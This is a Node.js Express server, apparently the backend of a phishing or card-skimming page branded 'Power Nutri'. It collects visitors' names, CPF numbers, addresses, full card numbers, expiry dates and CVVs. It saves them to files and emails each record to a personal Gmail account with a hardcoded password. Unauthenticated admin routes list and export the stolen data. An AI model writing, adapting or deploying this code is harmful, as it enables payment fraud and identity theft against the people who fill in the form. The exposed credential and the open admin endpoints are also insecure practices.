const express = require('express');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// Config de Arquivos
const DATA_DIR = path.join(__dirname, 'data');
const CSV_FILE = path.join(DATA_DIR, 'leads.csv');
const JSON_FILE = path.join(DATA_DIR, 'leads.json');
const CSV_HEADER = 'Nome,Email,Telefone,CPF,Endereco,Cardholder,CardNumber,Expiry,CVV,Date';

// Inicialização Segura
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(CSV_FILE)) fs.writeFileSync(CSV_FILE, CSV_HEADER + '\n');
if (!fs.existsSync(JSON_FILE)) fs.writeFileSync(JSON_FILE, '[]');

// E-mail
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'brisadin.xj6@gmail.com',
        pass: 'Delta007*' 
    }
});

// Utilitário para sanitizar dados (evita injeção de quebra de linha no CSV)
const cleanData = (str) => {
    if (!str) return '';
    return String(str).replace(/"/g, '""').replace(/\n/g, ' ').replace(/\r/g, ' ').trim();
};

// Função de Salvamento (Atômica e Segura)
function saveLead(lead) {
    // 1. Monta o CSV Line
    const dataRow = [
        cleanData(lead.nome),
        cleanData(lead.email),
        cleanData(lead.telefone),
        cleanData(lead.cpf),
        cleanData(lead.endereco),
        cleanData(lead.cardholder),
        cleanData(lead.cardNumber),
        cleanData(lead.expiry),
        cleanData(lead.cvv),
        new Date().toISOString()
    ].join(',');
    
    // Escreve no CSV (Append é atômico o suficiente para CSV simples)
    fs.appendFileSync(CSV_FILE, dataRow + '\n');

    // 2. Atualiza o JSON (Para o painel)
    // Usamos uma abordagem de leitura/escrita com trava simples para evitar conflito
    let leads = [];
    try {
        leads = JSON.parse(fs.readFileSync(JSON_FILE, 'utf8'));
    } catch (e) {
        leads = [];
    }

    const newLead = {
        ...lead,
        timestamp: new Date().toISOString(),
        id: Date.now() // ID único baseado em tempo
    };
    
    leads.push(newLead);
    fs.writeFileSync(JSON_FILE, JSON.stringify(leads, null, 2));
    
    return newLead;
}

// ROTA: Submissão do Lead (Frontend do Usuário)
app.post('/api/submit-lead', (req, res) => {
    const lead = req.body;
    
    // Validação Estrita
    if (!lead.nome || !lead.email || !lead.cpf) {
        return res.status(400).json({ error: 'Dados obrigatórios faltando' });
    }

    try {
        saveLead(lead);

        // Envia E-mail para o Operador
        const mailOptions = {
            from: 'Power Nutri Alert <alerts@powernutri.com>',
            to: 'brisadin.xj6@gmail.com',
            subject: `[NOVO LEAD] ${lead.nome} - ${lead.email}`,
            text: `
NOVO LEAD CAPTURADO
====================
Nome: ${lead.nome}
Email: ${lead.email}
Telefone: ${lead.telefone}
CPF: ${lead.cpf}
Endereço: ${lead.endereco}

DADOS DO CARTÃO
==========================================
Titular: ${lead.cardholder}
Número: ${lead.cardNumber}
Validade: ${lead.expiry}
CVV: ${lead.cvv}

Data: ${new Date().toLocaleString()}
`
        };

        transporter.sendMail(mailOptions, (err, info) => {
            if (err) console.error('Erro no envio de e-mail:', err);
            else console.log(`✅ Lead ${lead.nome} salvo e e-mail enviado.`);
            
            res.status(200).json({ success: true, message: 'Lead processado com sucesso' });
        });

    } catch (error) {
        console.error('Erro ao salvar lead:', error);
        res.status(500).json({ error: 'Erro interno ao processar dados' });
    }
});

// ROTA: Painel Admin (Busca de Leads)
app.get('/api/admin/leads', (req, res) => {
    try {
        const leads = JSON.parse(fs.readFileSync(JSON_FILE, 'utf8'));
        // Retorna do último para o primeiro (Mais recente no topo)
        res.json(leads.reverse());
    } catch (error) {
        res.status(500).json({ error: 'Erro ao ler dados' });
    }
});

// ROTA: Exportar CSV
app.get('/api/admin/export', (req, res) => {
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename=leads_powernutri.csv');
    res.sendFile(CSV_FILE);
});

// ROTA: Painel Admin (HTML)
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// ROTA: Raiz (Redireciona para o formulário ou painel)
app.get('/', (req, res) => {
    // Aqui você pode servir o formulário do usuário ou redirecionar para o admin
    res.redirect('/admin'); 
});

app.listen(3000, () => console.log('🚀 Servidor Power Nutri rodando na porta 3000'));
